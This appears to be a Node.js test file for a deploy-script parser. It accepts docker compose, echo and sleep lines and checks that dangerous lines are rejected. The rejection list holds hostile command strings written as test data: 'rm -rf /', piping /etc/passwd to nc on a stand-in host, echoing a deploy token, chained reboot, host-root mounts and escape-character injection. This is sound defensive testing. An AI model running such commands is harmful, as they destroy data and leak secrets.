'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const { parseScript, scriptError } = require('../lib/safe-script');

test('safe scripts parse into argument lists without a shell', () => {
  assert.deepEqual(parseScript(`
# migrate then restart
docker compose exec app npm run migrate
docker compose exec -T app node scripts/seed.js "hello world"
docker compose run --rm worker php artisan cache:clear
docker compose restart worker web
echo done
sleep 5
`), [
    { type: 'command', program: 'docker', args: ['compose', 'exec', '-T', 'app', 'npm', 'run', 'migrate'] },
    { type: 'command', program: 'docker', args: ['compose', 'exec', '-T', 'app', 'node', 'scripts/seed.js', 'hello world'] },
    { type: 'command', program: 'docker', args: ['compose', 'run', '--rm', '-T', 'worker', 'php', 'artisan', 'cache:clear'] },
    { type: 'command', program: 'docker', args: ['compose', 'restart', 'worker', 'web'] },
    { type: 'echo', text: 'done' },
    { type: 'sleep', seconds: 5 }
  ]);
  assert.deepEqual(parseScript(''), []);
});

test('unsafe scripts are rejected with the offending line', () => {
  const rejected = [
    'rm -rf /',
    'npm run migrate',
    'docker run -v /:/host alpine',
    'docker compose up -d',
    'docker compose exec app sh -c "a" ; rm -rf /',
    'docker compose exec app cat /etc/passwd | nc evil 1',
    'echo $DEPLOY_TOKEN',
    'echo `id`',
    'echo hi > /etc/motd',
    'docker compose exec app npm test && reboot',
    'docker compose exec --privileged app id',
    'docker compose exec -u root app id',
    'docker compose run app id',
    'docker compose run --rm -v /:/host app id',
    'docker compose exec app',
    'docker compose restart --timeout 0',
    'sleep 9999',
    'echo "unclosed',
    'echo \u001b[2Jcleared',
    'docker compose exec app id\u0000'
  ];
  for (const script of rejected) assert.ok(scriptError(script), script);
  assert.match(scriptError('echo ok\nrm -rf /'), /^Script line 2:/);
});
